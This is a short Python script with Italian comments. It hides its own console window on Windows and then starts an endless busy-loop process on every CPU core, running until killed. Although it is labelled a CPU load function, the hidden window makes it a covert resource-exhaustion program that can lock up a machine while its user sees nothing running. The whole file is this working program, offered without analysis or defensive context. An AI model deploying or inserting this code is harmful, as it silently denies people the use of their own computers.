import multiprocessing
import time
import ctypes
import os
import sys

# --- Nasconde la finestra della console su Windows ---
def hide_console():
    try:
        if os.name == 'nt':
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd != 0:
                ctypes.windll.user32.ShowWindow(hwnd, 0)  # 0 = SW_HIDE
    except:
        pass

# --- Funzione di carico CPU ---
def stress():
    while True:
        pass

if __name__ == "__main__":
    hide_console()
    cpu_count = multiprocessing.cpu_count()
    for _ in range(cpu_count):
        multiprocessing.Process(target=stress).start()
    while True:
        time.sleep(1)
